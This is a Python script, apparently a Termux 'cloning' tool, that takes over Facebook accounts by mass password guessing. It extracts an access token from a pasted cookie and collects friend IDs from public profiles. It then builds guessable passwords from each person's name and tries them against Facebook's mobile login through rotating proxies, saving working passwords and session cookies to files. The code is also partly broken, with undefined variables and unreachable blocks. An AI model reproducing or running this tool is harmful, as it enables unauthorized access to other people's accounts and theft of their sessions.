#-----------------[ IMPORT-MODULE ]-------------------
from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()

now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day

#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
	#print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[MX')
prox=open('.prox.txt','r').read().splitlines()
def UA1():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L31;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua = a+b
    return ua    
def UAA():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L31;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua = a+b
    return ua

#-----------------------[ UA-CODE ]-----------------------#
def ua():
    rr = str(random.randint(9, 11))
    aZ = random.choice(string.ascii_uppercase)
    rx = str(random.randrange(1, 999))
    chrome_version = f"{random.randint(99, 175)}.0.{random.randint(0, 5)}.{random.randint(0, 5)}"
    webkit_version = f"537.36" # Simplified, original is more complex
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64){aZ}{rx}{aZ}) AppleWebKit/{webkit_version} (KHTML, like Gecko) Chrome/{chrome_version} Safari/{webkit_version}"

def windows():
    aV = str(random.choice(range(10, 20)))
    nt_version = f"{random.choice(range(5, 7))}.1"
    chrome_version = f"{random.choice(range(8,12))}.0.{random.choice(range(552,661))}.0"
    return f'Mozilla/5.0 (Windows; U; Windows NT {nt_version}; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{chrome_version} Safari/534.{aV}'
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#------------------[ MACHINE-SUPPORT ]---------------#
def clear():
    os.system('clear')
    banner()
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "\x1b[1;91mPM"
else:
    a = ltx
    tag = "\x1b[1;96mAM"

def _MAMUN_(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	print(f"""
\x1b[1;92m╔═╗╔═╦═══╦═╗╔═╦╗─╔╦═╗─╔╗─╔═╗╔═╗
\x1b[1;92m║║╚╝║║╔═╗║║╚╝║║║─║║║╚╗║║─╚╗╚╝╔╝
\x1b[1;91m║╔╗╔╗║║─║║╔╗╔╗║║─║║╔╗╚╝║──╚╗╔╝
\x1b[1;91m║║║║║║╚═╝║║║║║║║─║║║╚╗║╠══╦╝╚╗
\x1b[1;92m║║║║║║╔═╗║║║║║║╚═╝║║─║║╠═╦╝╔╗╚╗
\x1b[1;92m╚╝╚╝╚╩╝─╚╩╝╚╝╚╩═══╩╝─╚═╝─╚═╝╚═╝   
\x1b[1;92m┏─────────────────────────────────────────┓
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m AUTHOR     \x1b[1;97m: \x1b[1;92mM A M U N     
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m FACEBOOK   \x1b[1;97m: \x1b[1;92mDAVID MAMUN WILLIAM                
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m WHATSAPP   \x1b[1;97m: \x1b[1;92m+880130406886               
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m STATUS     \x1b[1;97m: \x1b[1;92mFILE CLONING  
\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m GITHUB     \x1b[1;97m: \x1b[1;92mMAMUN-404-CYBER         
\x1b[1;92m┗─────────────────────────────────────────┛
 \x1b[1;92m""")
os.system('clear')
banner()
os.system("play-audio ASSALAMUALAIKUM_WELCOME_TO_MX_WORLD.mp3")
print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;31mWHAT IS YOUR NAME\033[40m\033[00m')
MAMUN_NAME=input(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ YOUR NAME ➣\x1b[1;96m ')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = ' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ CHECK YOUR INTERNET THEN TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='purple')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		asu = random.choice([m,k,h,b,u])
		cookie=input(f' \x1b[1;91m➣\x1b[1;96m➣\x1b[1;92m➣ [+] INPUT COOKIES :{asu} ')
		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (iPhone13,3; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
		find_token = re.search("(EAAG\w+)", data.text)
		ken=open(".token.txt", "w").write(find_token.group(1))
		cok=open(".cok.txt", "w").write(cookie)
		print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ LOGIN SUCCESSFUL \n \x1b[1;91m➣\x1b[1;96m➣\x1b[1;92m➣ TYPE \x1b[1;96mpython MX-M1.py');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mERROR BRO CHECK YOUR COOKIES ID')
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print(' \x1b[1;91m➣\x1b[1;96m➣\x1b[1;91m➣ Cookies Expired ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	_MAMUN_(f'\x1b[1;91m┏────────────────────────┓')
	_MAMUN_(f'\x1b[1;91m│\033[47m\033[1;30mPREMIUM USER INFORMATION\033[40m\033[00m\x1b[1;91m│')
	_MAMUN_(f'\x1b[1;91m┠─────────────┯──────────┛')
	_MAMUN_(f'\x1b[1;91m│\x1b[1;92mYOUR NAME\x1b[1;91m────╂➣\x1b[1;92m '+str(MAMUN_NAME))
	_MAMUN_(f'\x1b[1;91m│\x1b[1;92mYOUR ID NAME\x1b[1;91m─╂➣\x1b[1;92m {my_name}')
	_MAMUN_(f'\x1b[1;91m│\x1b[1;92mCLONING DATE\x1b[1;91m─╂➣ \x1b[1;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta}')
	_MAMUN_(f"\x1b[1;91m│\x1b[1;92mCLONING TIME\x1b[1;91m─╂➣ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
	_MAMUN_(f'\x1b[1;91m│\x1b[1;92mYOUR ID\x1b[1;91m──────╂➣\x1b[1;92m '+str(my_id))
	_MAMUN_(f'\x1b[1;91m│\x1b[1;92mYOUR IP\x1b[1;91m──────╂➣ \x1b[1;92m{ip}')
	_MAMUN_(f'\x1b[1;91m┗─────────────┛')
	_MAMUN_(f'\x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;34m  CRACK METHOD  \033[40m\033[00m')
	_MAMUN_(f'\x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m FILE CRACK')
	_MAMUN_(f'\x1b[1;91m[\x1b[1;92m2\x1b[1;91m]\x1b[1;92m CONTACT ME')
	_MAMUN_(f'\x1b[1;91m[\x1b[1;92m0\x1b[1;91m]\x1b[1;91m LOGOUT COOKIE & EXIT')
	_____MAMUN_____ = input('\x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;94mChoose ➣\x1b[1;92m ')
	if _____MAMUN_____ in ['1']:
		os.system("play-audio Firsr_Follow_My_GitHub.mp3")
		F()
	if _____MAMUN_____ in ['2']:
		os.system("play-audio Firsr_Follow_My_GitHub.mp3")
		os.system("xdg-open https://www.facebook.com/profile.php?id=100078539316286")
	if _____MAMUN_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ LogOut Successful ')
		exit()
	else:
		print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Successful Bra 😄 ')
		back()
def error():
	print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mSORRY, PLZ CHOOSE THE RIGHT MENU')
	time.sleep(2)
	back()
	
def P():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		os.system('clear')
		banner()
		jum = int(input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Target Id Limit ➣ \x1b[1;92m'))
	except ValueError:
		print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mWRONG TYPE ')
		exit()
	if jum<1 or jum>100:
		print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mWrong Type  ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(h+' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ ENTER PUBLIC ID \x1b[1;91m[\x1b[1;92m'+str(yz)+'\x1b[1;91m] \x1b[1;92m➣ \x1b[1;96m')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m CHECK YOUR INTERNET CONNECTION BRUH')
			exit()
	try:
		print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ TOTAL ID ➣ \x1b[1;96m'+str(len(id)))
		Settings()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m CHECK YOUR INTERNET CONNECTION BRUH')
		back()
	except (KeyError,IOError):
		print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m Your Id Maybe Not Public\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Check Your Id\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mThen Try Again')
		time.sleep(3)
		back()

#-------------[ CRACK-FROM-FILE ]------------------#
def F():
    os.system('clear');
    D().plerr()
    

class D:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear")
		banner()
		try:
			print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;34m     Example: /sdcard/MAMUN.txt     \033[40m\033[00m')
			fileX = input (' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ ENTER YOUR FILE ➣\x1b[1;93m ') 
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;92mTOTAL ID ➣ \x1b[1;92m'+str(len(id)))
			Settings()
		except IOError:
			print(" \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m FILE %s NOT FOUND\x1b[0m"%(fileX));time.sleep(2)
			F()
#-------------[ PENGATURAN-IDZ ]---------------#
def Settings():
	print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m CLONE ONLY MIX ID')
	hu = input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;94mCHOOSE ➣\x1b[1;92m ')
	if hu in ['0','00']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['1','01']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mWRONG OPTION BARA')
		exit()
	
	print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91m[\x1b[1;92m1\x1b[1;91m]\x1b[1;92m MOBILE ')
	hc = input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;94mCHOOSE ➣\x1b[1;92m ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	pwplus=input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \033[47m\033[1;35m     PASSWORD MENU     \033[40m\033[00m\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ MANUAL PASSWORD \x1b[1;91m[m]\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ AUTO PASSWORD \x1b[1;96m[d] \x1b[1;92m\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;94mChoose ➣ \x1b[1;92m')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'Add Password Manual Minimam 6 Character')
		pwku=input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Add Password Manual : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'\x1b[1;91m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m❴\033[47m\033[1;30mMX\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m●')
	print(f"\x1b[1;91m [😍] \x1b[1;92mYOUR NAME         \x1b[1;91m➢ \x1b[1;92m"+str(MAMUN_NAME))
	print(f"\x1b[1;91m [🚀] \x1b[1;92mTOTAL ID          \x1b[1;91m➢ \x1b[1;92m"+str(len(id)))
	print(f"\x1b[1;91m [💉] \x1b[1;92mTODAY TIME        \x1b[1;91m➢ \x1b[1;92m"+str(a)+":"+str(lt()[4])+" "+ tag+" ")
	print(f"\x1b[1;91m [💉] \x1b[1;92mTODAY DATE        \x1b[1;91m➢ \x1b[1;92m{ha}\x1b[1;91m/\x1b[1;92m{bu}\x1b[1;91m/\x1b[1;92m{ta} ")
	print(f"\x1b[1;91m [😩] \x1b[1;91mNOTE ➢ \33[1;92m[ USE AIRPLANE MODE BEFORE USE ] ")
	print(f'\x1b[1;91m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m❴\033[47m\033[1;30mMX\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\x1b[1;91m●\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(nmf+'@@')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'2020')
					pwv.append(frs+'2021')
					pwv.append(frs+'2022')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
	print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ CRACK COMPLETE ')
	print(f' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ OK : {h}%s '%(ok))
	print(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣  Main Manu \x1b[1;92m[Y]\n \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ \x1b[1;91mExit [T]')
	woi = input(' \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Choose : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t \x1b[1;91m➢\x1b[1;96m➣\x1b[1;92m➣ Allah Hafiz Bro {u} ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	batman = random.choice(["\x1b[1;91mSTART","\x1b[1;92mSTART","\x1b[1;93mSTART","\x1b[1;94mSTART","\x1b[1;95mSTART","\x1b[1;96mSTART","\x1b[1;97mSTART","\x1b[1;91mSTART","\x1b[1;92mSTART","\x1b[1;93mSTART","\x1b[1;94mSTART","\x1b[1;95mSTART","\x1b[1;96mSTART"])
	sys.stdout.write(f'\r\r\033[1;37m [{batman}{batman}\033[1;37m] ➤ [%s ➤ \033[1;32m%s\033[1;37m ➤ \x1b[38;5;246m%s\033[1;37m] '%(loop,len(oks),len(cps)));sys.stdout.flush()
	ugen = random.choice(ua)
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;93m[MX-CP] {idf} | {pw}{N}')     
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}\n [MX-OK] [💚] {idf} | {pw}\n [💉]COOKIES ➢ {kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
    try:os.system('git pull')
    except:pass
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.mkdir('DUMP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
    login()

